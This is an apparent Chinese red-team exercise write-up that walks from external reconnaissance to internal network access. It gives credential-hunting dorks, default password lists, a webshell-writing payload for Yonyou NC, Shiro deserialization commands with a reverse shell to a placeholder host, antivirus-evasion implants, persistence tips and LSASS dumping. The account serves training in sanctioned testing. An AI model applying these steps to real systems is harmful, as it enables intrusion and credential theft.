---
title: 记一次攻防演练实战直达内网
url: https://mp.weixin.qq.com/s/v5buXk-9W1_uH9quuwrOFQ
source: Doonsec's feed
date: 2026-03-14
fetch_date: 2026-03-15T04:32:43.050073
---

# 记一次攻防演练实战直达内网

![cover_image](https://mmbiz.qpic.cn/sz_mmbiz_jpg/Pled5HYvsFFfrDOyntD34JCheCTzbiaZ1NA9QJgzc3d7s9budWfQVEO0M0a1MbP5EZMW4CC8icXmNM1mmE9oHBs2HeicvGThJgtEJNPjIwdINU/0?wx_fmt=jpeg)

# 记一次攻防演练实战直达内网

hyyrent
hyyrent

只会看监控的实习生

![]()

在小说阅读器中沉浸阅读

# 0x01 外网打点

## 资产发现

**多测绘平台搜索**

https://hunter.qianxin.com/
https://fofa.info/
https://quake.360.cn/

![image_X8BSXnkylx.png](https://mmbiz.qpic.cn/mmbiz_png/Pled5HYvsFGF9ZnWPHl6hamC8ianrwhcVXzZxLWBKxH5XLwXUj1NKqiclvlj7IOXlx8uSX1yw5Ky8MTcBC0oXictYkBtQOuohPLPuRGjPsVutk/640?wx_fmt=png&from=appmsg)

![image_ctJSWbXB6F.png](https://mmbiz.qpic.cn/sz_mmbiz_png/Pled5HYvsFE68UBOrsic2sbIEH7JPBUdSpibFgicYLPbrGBFDTUkw4IqB8VSyx1O01wmPd20W1uHiccUqROLJIwBMl6yGvngJUjVMddbbUveOX4/640?wx_fmt=png&from=appmsg)

**多语法搜索**

假如某个目标站点为xxxx.com ，我们可以通过不同的语法进行资产搜集，搜集的资产会更全面
这里以fofa为例

```
domain="xxxx.com"
host="xxxx.com"
header="xxxx.com"
cert="xxxx.com"
```

## 敏感信息泄露

对于学校站点的信息搜集，一般来说外网能拿直接权限的点已经很少了，web应用大多是放在vpn后面，因此能弄到一个vpn账号可以说是事半功倍，这时候可以通过语法对此类信息进行挖掘

常用命令如下：

```
#google语法
site:*.edu.cn intext: vpn | 用户名 | 密码 | 帐号 | 默认密码

#github
*.edu.cn password
```

![image_22dBsSWKAO.png](https://mmbiz.qpic.cn/sz_mmbiz_png/Pled5HYvsFHUQYOibCl8uCGZsrZsggia1LO1TWibNlAh9csFj5S3FDibRUiaEk3yHpcbG3Me6qTlSxlr4EusDv3ZOsBsw99jD2UeXnH0Rp853apw/640?wx_fmt=png&from=appmsg)

在这次攻防演练里，也是幸运找到了某站点VPN的默认口令，使用的是 `姓名拼音/12345678` 弱口令

![image_i-KtUIqFmy.png](https://mmbiz.qpic.cn/mmbiz_png/Pled5HYvsFGTBY3chSTXCoY4vYNWqHOAnmZMvJlvM2JYqBRPrZtaicQTJhdYpEY1POiaqo7WXybbeoiazoNHOhseR9BIF1CtDc670mud6G04cE/640?wx_fmt=png&from=appmsg)

## 默认口令

对于部分站点，在搭建完成后可能没有更改默认账号密码，这时候可以尝试使用默认账密登录

下面列举一些常见的web站点默认口令

```
账号：
admin administrator root user test

密码：
admin admin123 123456123 test root
```

对于一些应用广泛的系统，可以通过google语法搜索其默认密码

![image_ejxlTxW5Av.png](https://mmbiz.qpic.cn/sz_mmbiz_png/Pled5HYvsFGNVW8B1QTibvVonAJm7ytHp4p4YROiaTqMkeEia4O9Ig3HVO3mEAGyG4fQnYrNgwriaOhruEdCGqG5A0Ucs3KOmvCOniaDNY7kMGNs/640?wx_fmt=png&from=appmsg)

这里通过`sysadmin/1` 成功登入泛微后台

![t1sb-w5grl_9Xl3mB_bqn.png](https://mmbiz.qpic.cn/mmbiz_png/Pled5HYvsFGP7d0QEdrF2TbgtM86sd4nU3lXb46XtpwcANqxLMAJtuhvyHib5SjWxnf6mbN5jRFKRBF8luozla9HCiaUlFOCydB4dY1laXsDI/640?wx_fmt=png&from=appmsg)

`nacos/nacos`

![image-20220723225803735.png](https://mmbiz.qpic.cn/sz_mmbiz_png/Pled5HYvsFHhJWicdMQEh9uMia6rsBYW0uWqgxZXxWic7RN8KLO5J3mxMllFp1Qj0jUeILjjU9FuHnibUbkRibJL7UxDjAx0PxicTqaKtQrl2N0sc/640?wx_fmt=png&from=appmsg)

## 常见漏洞利用

对于多目标的攻防演练，个人比惯把目标子域url搜集好，去重后批量导进去指纹识别工具，如Goby、fofahub

从指纹识别结果里筛选出重要资产进行突破，使用已知漏洞或day进行攻击

以下为一些批量漏洞利用工具：

https://github.com/Anonymous-ghost/AttackWebFrameworkTools-5.0
https://github.com/d3ckx1/Fvuln
https://github.com/W01fh4cker/Serein

框架类的如log4j、shiro、struts2等

OA类的如致远、泛微、用友、蓝凌等，这里也是找到了目标的用友nc站点

### 用友nc写shell

![56xk-0ba58_-A3uKrDLZX.png](https://mmbiz.qpic.cn/sz_mmbiz_png/Pled5HYvsFE3TNI4l8WCO8u8A3G4SYcbbARn9iaV98hiajlcs8qMk0jllf1dKB7HDORX03BLiaQ3DG1DoGMrqkMGrs7yNq5pI3kGnEqRDF32Y4/640?wx_fmt=png&from=appmsg)

访问接口/servlet/~ic/bsh.servlet.BshServlet执行命令

![d5lhwsk0r8_WfpuDtbLpm.png](https://mmbiz.qpic.cn/mmbiz_png/Pled5HYvsFG6h38WeKFyuZNpdTiakDzAmDrp3nSES1lpQXoxzibxlaFc6LznnYq5gPROwa32sxE3FbXMoycUeyG0f4icH5zj44jfxaqKc6Aibuk/640?wx_fmt=png&from=appmsg)

dnslog探测了一下发现不出网，这里直接写入webshell

1、首先生成一个哥斯拉的jsp木马，然后进行unicode编码

![image_796oyMMBO3.png](https://mmbiz.qpic.cn/mmbiz_png/Pled5HYvsFFGWWlGbY6tpdxgYwNlSMibFICUzAas9xygAzcCR3OvluoXB8QlAicDPhzA5iaamue7tdRHzFiarqLwNab6cPlicoeT6hpMkw8picDibA/640?wx_fmt=png&from=appmsg)

2、再把输出结果进行url编码

![image_zZUpiKMWn1.png](https://mmbiz.qpic.cn/sz_mmbiz_png/Pled5HYvsFGaBBmaD0KkUj5KSKSvibJ93TFs58Jh8ZMtVfBAAcfWNmCSsjB6qziaaXzS5nCPHq8UWmhicLiczLK6KxiapB543GrycWntwNMrnSqw/640?wx_fmt=png&from=appmsg)

3、payload字段如下，这里写入默认路径为 webapps/nc\_web ，实战中灵活应变

```
String keyWord = URLDecoder.decode("xxxxxx（填入生成内容）xxxxxx", "utf-8");
BufferedWriter out = new BufferedWriter(new FileWriter("/webapps/nc\_web/test.jsp"));
out.write(keyWord);
out.close();
```

这里直接写入哥斯拉马，连接成功

![b8xw2a-s9d_hjEIes_edE.png](https://mmbiz.qpic.cn/mmbiz_png/Pled5HYvsFHH6nCqN4XGj5JUFcrulwstXIViaXxBmabKl7PbpMKsPCy1dohW64N3IY0KZk0wJM9mxzPrjJrXJg0ZhclwDtwUcia4SISJcqMVQ/640?wx_fmt=png&from=appmsg)

### shiro无依赖链利用

通过测绘平台找到一个比较偏的资产，直接访问是一个静态页面，但扫描目录后指纹识别一波发现是shiro

直接使用shiro\_attack\_2.2工具开冲，发现有默认key但是无利用链

![image_ylgMY223mT.png](https://mmbiz.qpic.cn/mmbiz_png/Pled5HYvsFFiaw9sMFvA3yxqicWC8UqMMBOL0jUfdwMLBdMryGhdHqwtej2QFQB26KdXXY2yMspHBlT2AmQMbGYQdcJfJiaUw0zB1nPVeS1fMo/640?wx_fmt=png&from=appmsg)

可能有些人看到这里就放弃了，但这可能会错过一个利用点

shiro可以无依赖链利用，感觉有戏尝试一波

这里换用其他工具

![image-20220607115446156_b9JXMk_Qxy.png](https://mmbiz.qpic.cn/sz_mmbiz_png/Pled5HYvsFGpp9bbMcmZqBEy3Nia3oib6ibegWF3UeQcRDIOwNiaoI030xBMk4tLia9eCwpWTIJYzIToT6hkdRaPuquttM0FyY7KAhrwArO8xkVg/640?wx_fmt=png&from=appmsg)

通过dnslog测试有回显，这里有个注意点：使用 http://dnslog.cn/ 部分站点会拦截，可以换多个dnslog平台测试

![image_htB_EhwPH9.png](https://mmbiz.qpic.cn/sz_mmbiz_png/Pled5HYvsFEGUSTJa1FOiarFScFVjPAjyddh1RibSbemxOiaqTFhU5bkSpCmTCiaNmK4rTVN3erVQbXzwMicyzRSALEmTon9cc9R6pglgibkXBBQE/640?wx_fmt=png&from=appmsg)

dnslog有回显接下来就是拿shell了，这里由于固定思维，之前遇到的都是linux系统，先入为主觉得是Linux，结果没利用成功，一开始以为是防火墙拦截，后面探测了一下目录结构，发现是windows，所以这里payload要改变一下

这里可以通过网站快速生成payload
https://x.hacking8.com/java-runtime.html

```
Linux：
java -cp ysoserial-0.0.8-SNAPSHOT-all.jar ysoserial.exploit.JRMPListener 88 CommonsBeanutils1 "bash -c {echo,字段}|{base64,-d}|{bash,-i}"
字段=bash -i >& /dev/tcp/x.x.x.x/88880>&1 base64后的值
nc -lvp 端口

Windows：
java -jar JNDIExploit-1.0-SNAPSHOT.jar -i VPS地址
java -cp ysoserial-0.0.6-SNAPSHOT-1.8.3.jar ysoserial.exploit.JRMPListener 88 CommonsBeanutils2 "ldap://VPS地址:1389/Basic/Command/Base64/d2hvYW1p"
d2hvYW1p为命令的base64，这里是执行命令whoami
```

![image_wvD-c4KvV-.png](https://mmbiz.qpic.cn/mmbiz_png/Pled5HYvsFExy8tEAT6dm63v672QRA1TB0tYKqksroX4dt8lSWB7ibdvAue6K1nBtSicltAPo7o1a7jfRGQqR1p9Fnf0Jt8qVl6hicMUiaOPMxU/640?wx_fmt=png&from=appmsg)

# 0x02 内网渗透

## 杀软识别

拿到一台机器后，一般先看一下安装了什么安全防护产品

`tasklist /svc`

![-rr-ew4zvx_bjnBTV1EhH.png](https://mmbiz.qpic.cn/mmbiz_png/Pled5HYvsFFGNQjvuABE17AnmP62zhIibsd1R1n6NxBQsdtUozeia2ZibzLhwZ0HJnZSA7CpchMOcxevqC4lvSjwvIfDrl1S0hLIM6N2xyl6b0/640?wx_fmt=png&from=appmsg)

探测了一下发现安装了360，把之前准备好的bypass360马子扔上去，成功上线

![chm2qtadrh_QYKNvySqi7.png](https://mmbiz.qpic.cn/mmbiz_png/Pled5HYvsFEP52nBuM7C3t61qbQLdwuPhhGkmJYaTHzzty5oWelQ0GjESIqZNibUibfpv80uV00bXI7L3m0ReblJgj5BPqQQEcrAUhvyf6OLU/640?wx_fmt=png&from=appmsg)

## 隧道搭建

ping了一下发现机器出网，可以上frp搭建反向代理隧道

![7brv9u2oe7_ljYwWodDhg.png](https://mmbiz.qpic.cn/sz_mmbiz_png/Pled5HYvsFGXgpTb4LD8MLuYJS6dn0ibbIonky9828MmXUoOlgblFjj4YiaYWiaiaIu9AQOEPYicshZq3FfWibQgZU8zT7ia0JdXCA4zEThuVZXbicA/640?wx_fmt=png&from=appmsg)

proxifier配置相应的端口账密便可以进入内网

![h0a0j4rf5-_22woqcMQL4.png](https://mmbiz.qpic.cn/sz_mmbiz_png/Pled5HYvsFFy4r0mQ7tmZZP59iafP9NNC6OSiasGUGmRF1k4otRmI2ib3WFibmicaiaSDiabFz5ibR7SDYx3Vy3ibTXZYktfz3H5jqXsYzZ4h9n4BR3E/640?wx_fmt=png&from=appmsg)

## 横向思路

1、优先拿运维机器，一般存放着大量的账号密码信息

2、其次是集权设备，Vcenter、堡垒机、天擎这些，有day上day，没day寻找其他方法

3、有域的情况下，争取拿到域管hash，或者通过已知漏洞拿下域控

## 横向移动

在扫描之前，可以先通过netspy筛选可达的网段再进行扫描

https://github.com/shmilylty/netspy

![image_aAWQmEgoLW.png](https://mmbiz.qpic.cn/sz_mmbiz_png/Pled5HYvsFE9AicwXXvia06AeChW38zVaPmGBZqIPkzLkGOFjT9YI1YFEUianice1zOvymOs1vGWzgZF8ekKQf2hIasduSAtZBiarARFiax68yTNw/640?wx_fmt=png&from=appmsg)

接着上fscan对可达各个C段开扫，追求效率可只扫描22、80、443、445、1433、8080等重点端口

由于扫描会引起安全设备告警，因此横向尽可能在一小时内结束，避免入口机器被关机下线，对于拿到的机器可以通过计划任务进行维权，尽可能多拿几台机器保证口子不会掉，拿到机器后继续做信息搜集，网段，机器信息，敏感文件，xshell、navicat密码等常规的这里就不细说了

### dump lssas

正常没有杀软我们可以通过mimikatz抓取密码

但很多时候mimikatz会被拦截，这时候可以通过一些LOLBINS方法dump出来本地解

![image_xvtqu2JT5W.png](https://mmbiz.qpic.cn/mmbiz_png/Pled5HYvsFGiaib7NgCvZCh16yac5RvQlyXh5zO9TlbMLTOtQpDJMRmGULJibJycNz5xOgWS6z9EsUia8a69Pt6ZG3kibVfHWmPZ92hJwia3sr3ls/640?wx_fmt=png&from=appmsg)

这里使用的dump64.exe为白程序，位置位于

`C:\Program Files (x86)\Microsoft Visual Studio\Installer\Feedback\`

`dump64.exe pid c:\\users\\xxx\\Desktop\\out.dmp`

测试可过360和火绒

![image_w7zffbKEzi.png](https://mmbiz.qpic.cn/mmbiz_png/Pled5HYvsFGXyo2dsxHRSOtDakQsQUVVIxbSnxibV3bibxVEA6Gric9T7Ag2413FibKj1Rf0D9rKJLymWXE26Rsv7cbhIIViasw8YNAw4ialCbW...